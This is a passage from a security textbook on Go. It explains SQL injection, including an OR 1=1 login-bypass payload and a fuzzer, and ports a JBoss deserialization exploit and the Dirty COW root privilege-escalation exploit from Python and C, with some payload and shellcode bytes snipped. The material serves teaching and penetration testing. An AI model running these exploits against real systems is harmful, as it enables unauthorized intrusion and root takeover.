blindly\nconcatenate untrusted user data to their SQL queries, as in the\nfollowing pseudocode:\nusername = HTTP_GET[\"username\"]\nquery = \"SELECT * FROM users WHERE user = '\" + username + \"'\"\nresult = db.execute(query)\nif(len(result) > 0) {\nreturn AuthenticationSuccess()\nHivaNetwork.Com\nreturn AuthenticationSuccess()\n} else {\nreturn AuthenticationFailed()\n}\nIn our pseudocode, the username variable is read directly\nfrom an HTTP parameter. The value of the username variable\nisn’t sanitized or validated. You then build a query string by\nusing the value, concatenating it onto the SQL query syntax\ndirectly. The program executes the query against the database\nand inspects the result. If it finds at least one matching record,\nyou’d consider the authentication successful. The code should\nbehave appropriately so long as the supplied username\nconsists of alphanumeric and a certain subset of special\ncharacters. For example, supplying a username of alice results\nin the following safe query:\nSELECT * FROM users WHERE user = 'alice'\nHowever, what happens when the user supplies a username\ncontaining an apostrophe? Supplying a username of o'doyle\nproduces the following query:\nSELECT * FROM users WHERE user = 'o'doyle'\nThe problem here is that the backend database now sees an\nunbalanced number of single quotation marks. Notice the\nemphasized portion of the preceding query, doyle; the backend\ndatabase interprets this as SQL syntax, since it’s outside the\nenclosing quotes. This, of course, is invalid SQL syntax, and\nthe backend database won’t be able to process it. For error-\nbased SQL injection, this produces an error message in the\nHTTP response. The message itself will vary based on the\ndatabase. In the case of MySQL, you’ll receive an error\nsimilar to the following, possibly with additional details\ndisclosing the query itself:\nYou have an error in your SQL syntax\nAlthough we won’t go too deeply into exploitation, you\ncould now manipulate the username input to produce a valid\nSQL query that would bypass the authentication in our\nexample. The username input ' OR 1=1# does just that when\nplaced in the following SQL statement:\nSELECT * FROM users WHERE user = '' OR 1=1#'\nThis input appends a logical OR onto the end of the query.\nThis OR statement always evaluates to true, because 1 always\nequals 1. You then use a MySQL comment (#) to force the\nbackend database to ignore the remainder of the query. This\nresults in a valid SQL statement that, assuming one or more\nrows exist in the database, you can use to bypass\nauthentication in the preceding pseudocode example.\nBuilding the SQL Injection Fuzzer\nThe intent of your fuzzer won’t be to generate a syntactically\nvalid SQL statement. Quite the opposite. You’ll want to break\nthe query such that the malformed syntax yields an error by\nthe backend database, as the O’Doyle example just\ndemonstrated. For this, you’ll send various SQL meta-\ncharacters as input.\nThe first order of business is to analyze the target request.\nBy inspecting the HTML source code, using an intercepting\nproxy, or capturing network packets with Wireshark, you\ndetermine that the HTTP request submitted for the login portal\nresembles the following:\nPOST /WebApplication/login.jsp HTTP/1.1\nHost: 10.0.1.20:8080\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101\nFirefox/54.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\nReferer: http://10.0.1.20:8080/WebApplication/\nCookie: JSESSIONID=2D55A87C06A11AAE732A601FCB9DE571\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nusername=someuser&password=somepass\nThe login form sends a POST request to\nhttp://10.0.1.20:8080/WebApplication/login.jsp. There are two\nform parameters: username and password. For this example, we’ll\nlimit the fuzzing to the username field for brevity. The code itself\nis fairly compact, consisting of a few loops, some regular\nexpressions, and the creation of an HTTP request. It’s shown\nin Listing 9-2.\nfunc main() {\n❶ payloads := []string{\n\"baseline\",\n\")\",\n\"(\",\n\"\\\"\",\n\"'\",\n}\n❷ sqlErrors := []string{\n\"SQL\",\n\"MySQL\",\n\"ORA-\",\n\"syntax\",\n}\nerrRegexes := []*regexp.Regexp{}\nfor _, e := range sqlErrors {\n❸ re := regexp.MustCompile(fmt.Sprintf(\".*%s.*\", e))\nerrRegexes = append(errRegexes, re)\n}\n❹ for _, payload := range payloads {\nclient := new(http.Client)\n❺ body := []byte(fmt.Sprintf(\"username=%s&password=p\", payload))\n❻ req, err := http.NewRequest(\n\"POST\",\n\"http://10.0.1.20:8080/WebApplication/login.jsp\",\nbytes.NewReader(body),\n)\nif err != nil {\nlog.Fatalf(\"[!] Unable to generate request: %s\\n\", err)\n}\nreq.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")\nresp, err := client.Do(req)\nif err != nil {\nlog.Fatalf(\"[!] Unable to process response: %s\\n\", err)\n}\n❼ body, err = ioutil.ReadAll(resp.Body)\nif err != nil {\nlog.Fatalf(\"[!] Unable to read response body: %s\\n\", err)\n}\nresp.Body.Close()\n❽ for idx, re := range errRegexes {\n❾ if re.MatchString(string(body)) {\nfmt.Printf(\n\"[+] SQL Error found ('%s') for payload: %s\\n\",\nsqlErrors[idx],\npayload,\n)\nbreak\n}\n}\n}\n}\nListing 9-2: A SQL injection fuzzer (/ch-9/http_fuzz/main.go)\nThe code begins by defining a slice of payloads you want\nto attempt ❶. This is your fuzzing list that you’ll supply later\nas the value of the username request parameter. In the same vein,\nyou define a slice of strings that represent keywords within an\nSQL error message ❷. These will be the values you’ll search\nfor in the HTTP response body. The presence of any of these\nvalues is a strong indicator that an SQL error message is\npresent. You could expand on both of these lists, but they’re\nadequate datasets for this example.\nNext, you perform some preprocessing work. For each of\nthe error keywords you wish to search for, you build and\ncompile a regular expression ❸. You do this work outside\nyour main HTTP logic so you don’t have to create and\ncompile these regular expressions multiple times, once for\neach payload. A minor optimization, no doubt, but good\npractice nonetheless. You’ll use these compiled regular\nexpressions to populate a separate slice for use later.\nNext comes the core logic of the fuzzer. You loop through\neach of the payloads ❹, using each to build an appropriate\nHTTP request body whose username value is your current\npayload ❺. You use the resulting value to build an HTTP\nPOST request ❻, targeting your login form. You then set the\nContent-Type header and send the request by calling client.Do(req).\nNotice that you send the request by using the long-form\nprocess of creating a client and an individual request and then\ncalling client.Do(). You certainly could have used Go’s\nhttp.PostForm() function to achieve the same behavior more\nconcisely. However, the more verbose technique gives you\nmore granular control over HTTP header values. Although in\nthis example you’re setting only the Content-Type header, it’s not\nuncommon to set additional header values when making\nHTTP requests (such as User-Agent, Cookie, and others). You\ncan’t do this with http.PostForm(), so going the long route will\nmake it easier to add any necessary HTTP headers in the\nfuture, particularly if you’re ever interested in fuzzing the\nheaders themselves.\nNext, you read the HTTP response body by using\nioutil.ReadAll() ❼. Now that you have the body, you loop through\nall of your precompiled regular expressions ❽, testing the\nresponse body for the presence of your SQL error keywords\n❾. If you get a match, you probably have a SQL injection\nerror message. The program will log details of the payload and\nerror to the screen and move onto the next iteration of the\nloop.\nRun your code to confirm that it successfully identifies a\nSQL injection flaw in a vulnerable login form. If you supply\nthe username value with a single quotation mark, you’ll get the\nerror indicator SQL, as shown here:\n$ go run main.go\n[+] SQL Error found ('SQL') for payload: '\nWe encourage you to try the following exercises to help\nyou better understand the code, appreciate the nuances of"
  },
  {
    "input": "Porting Exploits to Go",
    "output": "HTTP communications, and improve your ability to detect\nSQL injection:\n1. Update the code to test for time-based SQL injection. To do this, you’ll have to\nsend various payloads that introduce a time delay when the backend query\nexecutes. You’ll need to measure the round-trip time and compare it against a\nbaseline request to deduce whether SQL injection is present.\n2. Update the code to test for boolean-based blind SQL injection. Although you can\nuse different indicators for this, a simple way is to compare the HTTP response\ncode against a baseline response. A deviation from the baseline response code,\nparticularly receiving a response code of 500 (internal server error), may be\nindicative of SQL injection.\n3. Rather than relying on Go’s net.http package to facilitate communications, try\nusing the net package to dial a raw TCP connection. When using the net\npackage, you’ll need to be aware of the Content-Length HTTP header, which\nrepresents the length of the message body. You’ll need to calculate this length\ncorrectly for each request because the body length may change. If you use an\ninvalid length value, the server will likely reject the request.\nIn the next section, we’ll show you how to port exploits to\nGo from other languages, such as Python or C.\nPORTING EXPLOITS TO GO\nFor various reasons, you may want to port an existing exploit\nto Go. Perhaps the existing exploit code is broken, incomplete,\nor incompatible with the system or version you wish to target.\nAlthough you could certainly extend or update the broken or\nincomplete code using the same language with which it was\ncreated, Go gives you the luxury of easy cross-compilation,\nconsistent syntax and indentation rules, and a powerful\nstandard library. All of this will make your exploit code\narguably more portable and readable without compromising on\nfeatures.\nLikely the most challenging task when porting an existing\nexploit is determining the equivalent Go libraries and function\ncalls to achieve the same level of functionality. For example,\naddressing endianness, encoding, and encryption equivalents\nmay take a bit of research, particularly for those who aren’t\nwell versed in Go. Fortunately, we’ve addressed the\ncomplexity of network-based communications in previous\nchapters. The implementations and nuances of this should,\nhopefully, be familiar.\nYou’ll find countless ways to use Go’s standard packages\nfor exploit development or porting. While it’s unrealistic for\nus to comprehensively cover these packages and use cases in a\nsingle chapter, we encourage you to explore Go’s official\ndocumentation at https://golang.org/pkg/. The documentation\nis extensive, with an abundance of good examples to help you\nunderstand function and package usage. Here are just a few of\nthe packages that will likely be of greatest interest to you when\nworking with exploitation:\nbytes Provides low-level byte manipulation\ncrypto Implements various symmetric and asymmetric\nciphers and message authentication\ndebug Inspects various file type metadata and contents\nencoding Encodes and decodes data by using various\ncommon forms such as binary, Hex, Base64, and more\nio and bufio Reads and writes data from and to various\ncommon interface types including the file system, standard\noutput, network connections, and more\nnet Facilitates client-server interaction by using various\nprotocols such as HTTP and SMTP\nos Executes and interacts with the local operating system\nsyscall Exposes an interface for making low-level system\ncalls\nunicode Encodes and decodes data by using UTF-16 or UTF-\n8\nunsafe Useful for avoiding Go’s type safety checks when\ninteracting with the operating system\nAdmittedly, some of these packages will prove to be more\nuseful in later chapters, particularly when we discuss low-level\nWindows interactions, but we’ve included this list for your\nawareness. Rather than trying to cover these packages in\ndetail, we’ll show you how to port an existing exploit by using\nsome of these packages.\nPorting an Exploit from Python\nIn this first example, you’ll port an exploit of the Java\ndeserialization vulnerability released in 2015. The\nvulnerability, categorized under several CVEs, affects the\ndeserialization of Java objects in common applications,\nservers, and libraries.1 This vulnerability is introduced by a\ndeserialization library that doesn’t validate input prior to\nserver-side execution (a common cause of vulnerabilities).\nWe’ll narrow our focus to exploiting JBoss, a popular Java\nEnterprise Edition application server. At\nhttps://github.com/roo7break/serialator/blob/master/serialator\n.py, you’ll find a Python script that contains logic to exploit\nthe vulnerability in multiple applications. Listing 9-3 provides\nthe logic you’ll replicate.\ndef jboss_attack(HOST, PORT, SSL_On, _cmd):\n# The below code is based on the jboss_java_serialize.nasl script within Nessus\n\"\"\"\nThis function sets up the attack payload for JBoss\n\"\"\"\nbody_serObj = hex2raw3(\"ACED000573720032737--SNIPPED FOR\nBREVITY--017400\") ❶\ncleng = len(_cmd)\nbody_serObj += chr(cleng) + _cmd ❷\nbody_serObj += hex2raw3(\"740004657865637571--SNIPPED FOR BREVITY-\n-7E003A\") ❸\nif SSL_On: ❹\nwebservice = httplib2.Http(disable_ssl_certificate_validation=True)\nURL_ADDR = \"%s://%s:%s\" % ('https',HOST,PORT)\nelse:\nwebservice = httplib2.Http()\nURL_ADDR = \"%s://%s:%s\" % ('http',HOST,PORT)\nheaders = {\"User-Agent\":\"JBoss_RCE_POC\", ❺\n\"Content-type\":\"application/x-java-serialized-object--SNIPPED FOR\nBREVITY--\",\n\"Content-length\":\"%d\" % len(body_serObj)\n}\nresp, content = webservice.request❻ (\nURL_ADDR+\"/invoker/JMXInvokerServlet\",\n\"POST\",\nbody=body_serObj,\nheaders=headers)\n# print provided response.\nprint(\"[i] Response received from target: %s\" % resp)\nListing 9-3: The Python serialization exploit code\nLet’s take a look at what you’re working with here. The\nfunction receives a host, port, SSL indicator, and operating\nsystem command as parameters. To build the proper request,\nthe function has to create a payload that represents a serialized\nJava object. This script starts by hardcoding a series of bytes\nonto a variable named body_serObj ❶. These bytes have been\nHivaNetwork.Com\nsnipped for brevity, but notice they are represented in the code\nas a string value. This is a hexadecimal string, which you’ll\nneed to convert to a byte array so that two characters of the\nstring become a single byte representation. For example,\nyou’ll need to convert AC to the hexadecimal byte \\xAC. To\naccomplish this conversion, the exploit code calls a function\nnamed hex2raw3. Details of this function’s underlying\nimplementation are inconsequential, so long as you understand\nwhat’s happening to the hexadecimal string.\nNext, the script calculates the length of the operating\nsystem command, and then appends the length and command\nto the body_serObj variable ❷. The script completes the\nconstruction of the payload by appending additional data that\nrepresents the remainder of your Java serialized object in a\nformat that JBoss can process ❸. Once the payload is\nconstructed, the script builds the URL and sets up SSL to\nignore invalid certificates, if necessary ❹. It then sets the\nrequired Content-Type and Content-Length HTTP headers ❺ and\nsends the malicious request to the target server ❻.\nMost of what’s presented in this script shouldn’t be new to\nyou, as we’ve covered the majority of it in previous chapters.\nIt’s now just a matter of making the equivalent function calls\nin a Go friendly manner. Listing 9-4 shows the Go version of\nthe exploit.\nfunc jboss(host string, ssl bool, cmd string) (int, error) {\nserializedObject, err := hex.DecodeString(\"ACED0005737--SNIPPED FOR\nBREVITY--017400\") ❶\nif err != nil {\nreturn 0, err\n}\nserializedObject = append(serializedObject, byte(len(cmd)))\nserializedObject = append(serializedObject, []byte(cmd)...) ❷\nafterBuf, err := hex.DecodeString(\"740004657865637571--SNIPPED FOR\nBREVITY--7E003A\") ❸\nif err != nil {\nreturn 0, err\n}\nserializedObject = append(serializedObject, afterBuf...)\nvar client *http.Client\nvar url string\nif ssl { ❹\nclient = &http.Client{\nTransport: &http.Transport{\nTLSClientConfig: &tls.Config{\nInsecureSkipVerify: true,\n},\n},\n}\nurl = fmt.Sprintf(\"https://%s/invoker/JMXInvokerServlet\", host)\n} else {\nclient = &http.Client{}\nurl = fmt.Sprintf(\"http://%s/invoker/JMXInvokerServlet\", host)\n}\nreq, err := http.NewRequest(\"POST\", url, bytes.NewReader(serializedObject))\nif err != nil {\nreturn 0, err\n}\nreq.Header.Set( ❺\n\"User-Agent\",\n\"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like\nGecko\")\nreq.Header.Set(\n\"Content-Type\",\n\"application/x-java-serialized-object;\nclass=org.jboss.invocation.MarshalledValue\")\nresp, err := client.Do(req) ❻\nif err != nil {\nreturn 0, err\n}\nreturn resp.StatusCode, nil\n}\nListing 9-4: The Go equivalent of the original Python serialization exploit (/ch-\n9/jboss/main.go)\nThe code is nearly a line-by-line reproduction of the\nPython version. For this reason, we’ve set the annotations to\nalign with their Python counterparts, so you’ll be able to\nfollow the changes we’ve made.\nFirst, you construct your payload by defining your\nserialized Java object byte slice ❶, hardcoding the portion\nbefore your operating system command. Unlike the Python\nversion, which relied on user-defined logic to convert your\nhexadecimal string to a byte array, the Go version uses the\nhex.DecodeString() from the encoding/hex package. Next, you\ndetermine the length of your operating system command, and\nthen append it and the command itself to your payload ❷.\nYou complete the construction of your payload by decoding\nyour hardcoded hexadecimal trailer string onto your existing\npayload ❸. The code for this is slightly more verbose than the\nPython version because we intentionally added in additional\nerror handling, but it’s also able to use Go’s standard encoding\npackage to easily decode your hexadecimal string.\nYou proceed to initialize your HTTP client ❹, configuring\nit for SSL communications if requested, and then build a\nPOST request. Prior to sending the request, you set your\nnecessary HTTP headers ❺ so that the JBoss server interprets\nthe content type appropriately. Notice that you don’t explicitly\nset the Content-Length HTTP header. That’s because Go’s http\npackage does that for you automatically. Finally, you send\nyour malicious request by calling client.Do(req) ❻.\nFor the most part, this code makes use of what you’ve\nalready learned. The code introduces small modifications such\nas configuring SSL to ignore invalid certificates ❹ and adding\nspecific HTTP headers ❺. Perhaps the one novel element in\nour code is the use of hex.DecodeString(), which is a Go core\nfunction that translates a hexadecimal string to its equivalent\nbyte representation. You’d have to do this manually in Python.\nTable 9-2 shows some additional, commonly encountered\nPython functions or constructs with their Go equivalents.\nThis is not a comprehensive list of functional mappings.\nToo many variations and edge cases exist to cover all the\npossible functions required for porting exploits. We’re hopeful\nthat this will help you translate at least some of the most\ncommon Python functions to Go.\nTable 9-2: Common Python Functions and Their Go Equivalents\nPython Go Notes\nhex(x) fmt.Sprintf(\" %#x\", Converts an integer, x, to a\nx) lowercase hexadecimal string,\nprefixed with \"0x\".\nord(c) rune(c) Used to retrieve the integer\n(int32) value of a single\ncharacter. Works for standard\n8-bit strings or multibyte\nUnicode. Note that rune is a\nbuilt-in type in Go and makes\nworking with ASCII and\nUnicode data fairly simple.\nchr(i) and unichr(i) fmt.Sprintf(\"%+q\", The inverse of ord in Python,\nrune(i)) chr and unichr return a string\nof length 1 for the integer\ninput. In Go, you use the rune\ntype and can retrieve it as a\nstring by using the %+q\nformat sequence.\nstruct.pack(fmt, v1, binary.Write(. . .) Creates a binary\nv2, . . .) representation of the data,\nformatted appropriately for\ntype and endianness.\nstruct.unpack(fmt, binary.Read(. . .) The inverse of struct.pack and\nstring) binary.Write. Reads\nstructured binary data into a\nspecified format and type.\nPorting an Exploit from C\nLet’s step away from Python and focus on C. C is arguably a\nless readable language than Python, yet C shares more\nsimilarities with Go than Python does. This makes porting\nexploits from C easier than you might think. To demonstrate,\nwe’ll be porting a local privilege escalation exploit for Linux.\nThe vulnerability, dubbed Dirty COW, pertains to a race\ncondition within the Linux kernel’s memory subsystem. This\nflaw affected most, if not all, common Linux and Android\ndistributions at the time of disclosure. The vulnerability has\nsince been patched, so you’ll need to take some specific\nmeasures to reproduce the examples that follow. Specifically,\nyou’ll need to configure a Linux system with a vulnerable\nkernel version. Setting this up is beyond the scope of the\nchapter; however, for reference, we use a 64-bit Ubuntu 14.04\nLTS distribution with kernel version 3.13.1.\nSeveral variations of the exploit are publicly available. You\ncan find the one we intend to replicate at https://www.exploit-\ndb.com/exploits/40616/. Listing 9-5 shows the original exploit\ncode, slightly modified for readability, in its entirety.\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <string.h>\n#include <unistd.h>\nvoid *map;\nint f;\nint stop = 0;\nstruct stat st;\nchar *name;\npthread_t pth1,pth2,pth3;\n// change if no permissions to read\nchar suid_binary[] = \"/usr/bin/passwd\";\nunsigned char sc[] = {\n0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n--snip--\n0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n};\nunsigned int sc_len = 177;\nvoid *madviseThread(void *arg)\n{\nchar *str;\nstr=(char*)arg;\nint i,c=0;\nfor(i=0;i<1000000 && !stop;i++) {\nc+=madvise(map,100,MADV_DONTNEED);\n}\nprintf(\"thread stopped\\n\");\n}\nvoid *procselfmemThread(void *arg)\n{\nchar *str;\nstr=(char*)arg;\nint f=open(\"/proc/self/mem\",O_RDWR);\nint i,c=0;\nfor(i=0;i<1000000 && !stop;i++) {\nlseek(f,map,SEEK_SET);\nc+=write(f, str, sc_len);\n}\nprintf(\"thread stopped\\n\");\n}\nvoid *waitForWrite(void *arg) {\nchar buf[sc_len];\nfor(;;) {\nFILE *fp = fopen(suid_binary, \"rb\");\nfread(buf, sc_len, 1, fp);\nif(memcmp(buf, sc, sc_len) == 0) {\nprintf(\"%s is overwritten\\n\", suid_binary);\nbreak;\n}\nfclose(fp);\nsleep(1);\n}\nstop = 1;\nprintf(\"Popping root shell.\\n\");\nprintf(\"Don't forget to restore /tmp/bak\\n\");\nsystem(suid_binary);\n}\nint main(int argc,char *argv[]) {\nchar *backup;\nprintf(\"DirtyCow root privilege escalation\\n\");\nprintf(\"Backing up %s.. to /tmp/bak\\n\", suid_binary);\nasprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\nsystem(backup);\nf = open(suid_binary,O_RDONLY);\nfstat(f,&st);\nprintf(\"Size of binary: %d\\n\", st.st_size);\nchar payload[st.st_size];\nmemset(payload, 0x90, st.st_size);\nmemcpy(payload, sc, sc_len+1);\nmap = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\nprintf(\"Racing, this may take a while..\\n\");\npthread_create(&pth1, NULL, &madviseThread, suid_binary);\npthread_create(&pth2, NULL, &procselfmemThread, payload);\npthread_create(&pth3, NULL, &waitForWrite, NULL);\npthread_join(pth3, NULL);\nreturn 0;\n}\nListing 9-5: The Dirty COW privilege escalation exploit written in the C language\nRather than explaining the details of the C code’s logic,\nlet’s look at it generally, and then break it into chunks to\ncompare it line by line with the Go version.\nThe exploit defines some malicious shellcode, in\nExecutable and Linkable Format (ELF), that generates a Linux\nshell. It executes the code as a privileged user by creating\nmultiple threads that call various system functions to write our\nshellcode to memory locations. Eventually, the shellcode\nexploits the vulnerability by overwriting the contents of a\nbinary executable file that happens to have the SUID bit set\nand belongs to the root user. In this case, that binary is\n/usr/bin/passwd. Normally, a nonroot user wouldn’t be able to\noverwrite the file. However, because of the Dirty COW\nvulnerability, you achieve privilege escalation because you\ncan write arbitrary contents to the file while preserving the file\npermissions.\nNow let’s break the C code into easily digestible portions\nand compare each section with its equivalent in Go. Note that\nthe Go version is specifically trying to achieve a line-by-line\nreproduction of the C version. Listing 9-6 shows the global\nvariables defined or initialized outside our functions in C,\nwhile Listing 9-7 shows them in Go.\n❶ void *map;\nint f;\n❷ int stop = 0;\nstruct stat st;\nchar *name;\npthread_t pth1,pth2,pth3;\n// change if no permissions to read\n❸ char suid_binary[] = \"/usr/bin/passwd\";\n❹ unsigned char sc[] = {\n0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n--snip--\n0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n};\nunsigned int sc_len = 177;\nListing 9-6: Initialization in C\n❶ var mapp uintptr\n❷ var signals = make(chan bool, 2)\n❸ const SuidBinary = \"/usr/bin/passwd\"\n❹ var sc = []byte{\n0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n--snip--\n0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,\n}\nListing 9-7: Initialization in Go\nThe translation between C and Go is fairly straightforward.\nThe two code sections, C and Go, maintain the same\nnumbering to demonstrate how Go achieves similar\nfunctionality to the respective lines of C code. In both cases,\nyou track mapped memory by defining a uintptr variable ❶. In\nGo, you declare the variable name as mapp since, unlike C, map\nis a reserved keyword in Go. You then initialize a variable to\nbe used for signaling the threads to stop processing ❷. Rather\nthan use an integer, as the C code does, the Go convention is\ninstead to use a buffered boolean channel. You explicitly\ndefine its length to be 2 since there will be two concurrent\nfunctions that you’ll wish to signal. Next, you define a string\nto your SUID executable ❸ and wrap up your global variables\nby hardcoding your shellcode into a slice ❹. A handful of\nglobal variables were omitted in the Go code compared to the\nC version, which means you’ll define them as needed within\ntheir respective code blocks.\nNext, let’s look at madvise() and procselfmem(), the two primary\nfunctions that exploit the race condition. Again, we’ll compare\nthe C version in Listing 9-8 with the Go version in Listing 9-9.\nvoid *madviseThread(void *arg)\n{\nchar *str;\nHivaNetwork.Com\nstr=(char*)arg;\nint i,c=0;\nfor(i=0;i<1000000 && !stop;i++❶) {\nc+=madvise(map,100,MADV_DONTNEED)❷;\n}\nprintf(\"thread stopped\\n\");\n}\nvoid *procselfmemThread(void *arg)\n{\nchar *str;\nstr=(char*)arg;\nint f=open(\"/proc/self/mem\",O_RDWR);\nint i,c=0;\nfor(i=0;i<1000000 && !stop;i++❶) {\n❸ lseek(f,map,SEEK_SET);\nc+=write(f, str, sc_len)❹;\n}\nprintf(\"thread stopped\\n\");\n}\nListing 9-8: Race condition functions in C\nfunc madvise() {\nfor i := 0; i < 1000000; i++ {\nselect {\ncase <- signals: ❶\nfmt.Println(\"madvise done\")\nreturn\ndefault:\nsyscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100),\nsyscall.MADV_DONTNEED) ❷\n}\n}\n}\nfunc procselfmem(payload []byte) {\nf, err := os.OpenFile(\"/proc/self/mem\", syscall.O_RDWR, 0)\nif err != nil {\nlog.Fatal(err)\n}\nfor i := 0; i < 1000000; i++ {\nselect {\ncase <- signals: ❶\nfmt.Println(\"procselfmem done\")\nreturn\ndefault:\nsyscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))\n❸\nf.Write(payload) ❹\n}\n}\n}\nListing 9-9: Race condition functions in Go\nThe race condition functions use variations for signaling\n❶. Both functions contain for loops that iterate an extensive\nnumber of times. The C version checks the value of the stop\nvariable, while the Go version uses a select statement that\nattempts to read from the signals channel. When a signal is\npresent, the function returns. In the event that no signal is\nwaiting, the default case executes. The primary differences\nbetween the madvise() and procselfmem() functions occur within the\ndefault case. Within our madvise() function, you issue a Linux\nsystem call to the madvise() ❷ function, whereas your\nprocselfmem() function issues Linux system calls to lseek() ❸ and\nwrites your payload to memory ❹.\nHere are the main differences between the C and Go\nversions of these functions:\nThe Go version uses a channel to determine when to prematurely break the loop,\nwhile the C function uses an integer value to signal when to break the loop after\nthe thread race condition has occurred.\nThe Go version uses the syscall package to issue Linux system calls. The\nparameters passed to the function include the system function to be called and its\nrequired parameters. You can find the name, purpose, and parameters of the\nfunction by searching Linux documentation. This is how we are able to call\nnative Linux functions.\nNow, let’s review the waitForWrite() function, which monitors\nfor the presence of changes to SUID in order to execute the\nshellcode. The C version is shown in Listing 9-10, and the Go\nversion is shown in Listing 9-11.\nvoid *waitForWrite(void *arg) {\nchar buf[sc_len];\n❶ for(;;) {\nFILE *fp = fopen(suid_binary, \"rb\");\nfread(buf, sc_len, 1, fp);\nif(memcmp(buf, sc, sc_len) == 0) {\nprintf(\"%s is overwritten\\n\", suid_binary);\nbreak;\n}\nfclose(fp);\nsleep(1);\n}\n❷ stop = 1;\nprintf(\"Popping root shell.\\n\");\nprintf(\"Don't forget to restore /tmp/bak\\n\");\n❸ system(suid_binary);\n}\nListing 9-10: The waitForWrite() function in C\nfunc waitForWrite() {\nbuf := make([]byte, len(sc))\n❶ for {\nf, err := os.Open(SuidBinary)\nif err != nil {\nlog.Fatal(err)\n}\nif _, err := f.Read(buf); err != nil {\nlog.Fatal(err)\n}\nf.Close()\nif bytes.Compare(buf, sc) == 0 {\nfmt.Printf(\"%s is overwritten\\n\", SuidBinary)\nbreak\n}\ntime.Sleep(1*time.Second)\n}\n❷ signals <- true\nsignals <- true\nfmt.Println(\"Popping root shell\")\nfmt.Println(\"Don't forget to restore /tmp/bak\\n\")\nattr := os.ProcAttr {\nFiles: []*os.File{os.Stdin, os.Stdout, os.Stderr},\n}\nproc, err := os.StartProcess(SuidBinary, nil, &attr) ❸\nif err !=nil {\nlog.Fatal(err)\n}\nproc.Wait()\nos.Exit(0)\n}\nListing 9-11: The waitForWrite() function in Go\nIn both cases, the code defines an infinite loop that\nmonitors the SUID binary file for changes ❶. While the C\nversion uses memcmp() to check whether the shellcode has been\nwritten to the target, the Go code uses bytes.Compare(). When the\nshellcode is present, you’ll know the exploit succeeded in\noverwriting the file. You then break out of the infinite loop\nand signal the running threads that they can now stop ❷. As\nwith the code for the race conditions, the Go version does this\nvia a channel, while the C version uses an integer. Lastly, you\nexecute what is probably the best part of the function: the\nSUID target file that now has your malicious code within it ❸.\nThe Go version is a little bit more verbose, as you need to pass\nin attributes corresponding to stdin, stdout, and stderr: files\npointers to open input files, output files, and error file\ndescriptors, respectively.\nNow let’s look at our main() function, which calls the\nprevious functions necessary to execute this exploit. Listing 9-\n12 shows the C version, and Listing 9-13 shows the Go\nversion.\nint main(int argc,char *argv[]) {\nchar *backup;\nprintf(\"DirtyCow root privilege escalation\\n\");\nprintf(\"Backing up %s.. to /tmp/bak\\n\", suid_binary);\n❶ asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\nsystem(backup);\n❷ f = open(suid_binary,O_RDONLY);\nfstat(f,&st);\nprintf(\"Size of binary: %d\\n\", st.st_size);\n❸ char payload[st.st_size];\nmemset(payload, 0x90, st.st_size);\nmemcpy(payload, sc, sc_len+1);\n❹ map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\nprintf(\"Racing, this may take a while..\\n\");\n❺ pthread_create(&pth1, NULL, &madviseThread, suid_binary);\npthread_create(&pth2, NULL, &procselfmemThread, payload);\npthread_create(&pth3, NULL, &waitForWrite, NULL);\npthread_join(pth3, NULL);\nreturn 0;\n}\nListing 9-12: The main() function in C\nfunc main() {\nfmt.Println(\"DirtyCow root privilege escalation\")\nfmt.Printf(\"Backing up %s.. to /tmp/bak\\n\", SuidBinary)\n❶ backup := exec.Command(\"cp\", SuidBinary, \"/tmp/bak\")\nif err := backup.Run(); err != nil {\nlog.Fatal(err)\n}\n❷ f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)\nif err != nil {\nlog.Fatal(err)\n}\nst, err := f.Stat()\nif err != nil {\nlog.Fatal(err)\n}\nfmt.Printf(\"Size of binary: %d\\n\", st.Size())\n❸ payload := make([]byte, st.Size())\nfor i, _ := range payload {\npayload[i] = 0x90\n}\nfor i, v := range sc {\npayload[i] = v\n}\n❹ mapp, _, _ = syscall.Syscall6(\nsyscall.SYS_MMAP,\nuintptr(0),\nuintptr(st.Size()),\nuintptr(syscall.PROT_READ),\nuintptr(syscall.MAP_PRIVATE),\nf.Fd(),\n0,\n)\nfmt.Println(\"Racing, this may take a while..\\n\")\n❺ go madvise()\ngo procselfmem(payload)\nwaitForWrite()\n}\nListing 9-13: The main() function in Go\nThe main() function starts by backing up the target\nexecutable ❶. Since you’ll eventually be overwriting it, you\ndon’t want to lose the original version; doing so may adversely\naffect the system. While C allows you to run an operating\nsystem command by calling system() and passing it the entire\ncommand as a single string, the Go version relies on the\nexec.Command() function, which requires you to pass the\ncommand as separate arguments. Next, you open the SUID\ntarget file in read-only mode ❷, retrieving the file stats, and\nthen use them to initialize a payload slice of identical size as\nthe target file ❸. In C, you fill the array with NOP (0x90)\ninstructions by calling memset(), and then copy over a portion of\nthe array with your shellcode by calling memcpy(). These are\nconvenience functions that don’t exist in Go.\nInstead, in Go, you loop over the slice elements and\nmanually populate them one byte at a time. After doing so,\nyou issue a Linux system call to the mapp() function ❹, which\nmaps the contents of your target SUID file to 